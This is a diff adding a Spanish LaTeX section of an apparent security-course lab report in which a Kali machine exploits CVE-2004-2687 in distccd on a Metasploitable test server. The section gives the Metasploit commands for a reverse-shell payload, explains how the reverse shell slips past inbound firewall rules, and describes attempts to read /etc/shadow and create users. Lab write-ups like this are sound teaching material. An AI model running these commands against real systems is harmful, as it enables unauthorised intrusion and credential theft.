@@ -1,0 +1,70 @@
+% === Figuras/capturas FIJAS (no flotantes): se quedan donde se escriben, en orden. ===
+% Evitan el reordenamiento de figure[htbp]. Idempotente (\providecommand) y solo con
+% paquetes ya cargados por la clase. Firma igual que \captura: \capturafija[opts]{img}{pie}.
+\providecommand{\figurafija}[2]{%
+  \par\medskip
+  \begingroup\centering
+    #1\par\smallskip
+    \refstepcounter{figure}%
+    \begin{minipage}{0.86\linewidth}\centering\small
+      \textbf{\figurename~\thefigure:}\hspace{0.4em}#2\par
+    \end{minipage}\par
+  \endgroup
+  \par\medskip
+}
+\providecommand{\capturafija}[3][width=0.8\linewidth]{%
+  \figurafija{%
+    \IfFileExists{pics/#2}{\includegraphics[#1]{pics/#2}}{%
+      \fbox{\parbox{0.7\linewidth}{\centering\ttfamily\small pics/#2\\[3pt]%
+        \normalfont\footnotesize(captura pendiente)}}%
+    }%
+  }{#3}%
+}
+
+% sections/04-explotacion-distcc.tex
+\section{Fase de explotación: distccd (CVE-2004-2687)}
+
+\subsection{Direcciones IP del montaje}
+
+Para la explotación se dispuso de la máquina virtual Kali Linux (10.38.90.218) frente al servidor de pruebas Metasploitable (10.38.90.255); la guía advierte que las direcciones pueden cambiar entre montajes, por lo que se validaron ambas antes de ejecutar el exploit (la del servidor con el escaneo de la fase anterior y la de Kali con \texttt{ifconfig}).
+
+\pregunta{Realice un análisis de la vulnerabilidad reportada con el CVE-2004-2687.}
+\begin{respuesta}
+El CVE-2004-2687 corresponde a \texttt{distccd}, el demonio del compilador distribuido distcc (puerto 3632/TCP), pensado para repartir trabajos de compilación entre varias máquinas de una red: La falla consiste en que el demonio acepta y ejecuta los comandos que recibe \textbf{sin ningún tipo de autenticación ni restricción}, de forma que cualquier atacante que alcance el puerto puede enviar comandos arbitrarios que el servidor ejecuta con los privilegios de la cuenta bajo la que corre el servicio, obteniendo así ejecución remota de código (con un CVSS que en las versiones recientes del vector llega a 9.8/10). Afecta a distcc hasta la versión 2.18.2 y Metasploitable lo trae deliberadamente expuesto, de manera que el módulo de Metasploit que lo materializa es \texttt{exploit/unix/misc/distcc\_exec} \cite{nvd-distcc}.
+\end{respuesta}
+
+\subsection{Búsqueda, configuración y ejecución del exploit}
+
+Se accedió a la consola de Metasploit desde el menú \texttt{APLICACIONES/08-Herramientas de Explotación/Metasploit framework} y, estando en la consola, se buscó el exploit disponible para el servicio distcc, se cargó el módulo, se configuró la carga y el objetivo, y se ejecutó el ataque:
+
+\begin{lstlisting}
+msf > search distcc
+msf > use exploit/unix/misc/distcc_exec
+msf exploit (unix/misc/distcc_exec) > set payload cmd/unix/reverse
+msf exploit (unix/misc/distcc_exec) > set rhosts 10.38.90.255
+msf exploit (unix/misc/distcc_exec) > exploit
+\end{lstlisting}
+
+\capturafija{msf-exploit-one.png}{Flujo completo sobre distccd: búsqueda del módulo, configuración de la carga y el objetivo, ejecución del exploit y verificación del usuario con \texttt{whoami}.}
+
+\begin{analisis}
+La búsqueda \texttt{search distcc} devolvió un único módulo, \texttt{exploit/unix/misc/distcc\_exec}, con rango \texttt{excellent} y la marca \texttt{Check: Yes}, lo que indica un exploit de máxima fiabilidad que además puede comprobar la vulnerabilidad antes de lanzarla, correspondiente exactamente al servicio identificado en el escaneo. Al cargar el módulo, Metasploit tomó por defecto la carga \eng{reverse} (\texttt{cmd/unix/reverse}) y solo hizo falta fijar el objetivo con \texttt{set rhosts 10.38.90.255}, pues el \texttt{LHOST} lo resolvió solo con la IP de la máquina atacante. Al ejecutar \texttt{exploit}, la consola levantó el manejador (\texttt{Started reverse TCP double handler on 10.38.90.218:4444}), aceptó las conexiones del servidor comprometido y abrió la sesión (\texttt{Command shell session 1 opened (10.38.90.218:4444 -> 10.38.90.255:45184)}); resulta clave que la conexión la inicia el \textbf{propio servidor hacia el atacante} (shell reversa), de modo que se evaden las reglas de entrada de un cortafuegos, que normalmente sí bloquearía una conexión entrante pero no una saliente. Finalmente, el \texttt{whoami} devolvió \texttt{daemon}: la sesión se obtuvo con la cuenta de servicio sin privilegios bajo la que corre distccd, dato que resulta determinante para la comparación con la explotación de VSFTPD de la sección siguiente.
+\end{analisis}
+
+\subsection{Enumeración y administración desde la sesión daemon}
+
+Con la sesión abierta se intentó enumerar el servidor y ejecutar las tareas de administración que solicita la guía (leer \texttt{/etc/passwd} y \texttt{/etc/shadow}, listar los grupos con \texttt{getent group}, y crear un usuario y un grupo de red asignándolos entre sí); sin embargo, por el privilegio de la sesión estas operaciones no prosperan, tal como se anticipa a continuación.
+
+\begin{analisis}
+Al correr la sesión con el usuario \texttt{daemon} (sin privilegios), toda operación que exija escribir en \texttt{/etc/passwd}, \texttt{/etc/shadow} o \texttt{/etc/group} —esto es, \texttt{useradd}, \texttt{groupadd} y \texttt{usermod}— termina rechazada con \eng{permission denied}, pues esos archivos solo los altera \texttt{root}; por la misma razón, \texttt{/etc/shadow} (donde viven los hashes de contraseña) no puede leerse desde esta sesión, aunque \texttt{/etc/passwd}, legible por cualquier usuario, sí. En la evidencia de la consola se observa que la cuenta obtenida es \texttt{daemon} y que la exploración del sistema de archivos apenas alcanza a listar el directorio de trabajo del demonio, de modo que la incapacidad de administrar el servidor es precisamente el hallazgo de esta explotación: el servicio comprometido corre con el mínimo privilegio necesario y ello contiene el impacto. La evidencia gráfica de la enumeración y de la administración plena (lectura de \texttt{/etc/shadow}, creación de usuarios y grupos) se documenta sobre la sesión \texttt{root} obtenida con VSFTPD en la sección siguiente, donde estas mismas operaciones sí se completan.
+\end{analisis}
+
+\porque{capturas opcionales de distcc}{%
+  Si quieren evidenciar en esta misma sección los rechazos de \texttt{useradd} /
+  \texttt{groupadd} / \texttt{usermod} en la sesión \texttt{daemon}, tomen una captura del
+  \eng{permission denied} y agréguenla con
+  \texttt{\textbackslash capturafija\{distcc-denegado.png\}\{\dots\}}; hoy solo se cuenta
+  con la captura del flujo del exploit (\texttt{msf-exploit-one.png}), así que el
+  comportamiento se explica de forma razonada y la evidencia plena se remite a la
+  sección 5.%
+}
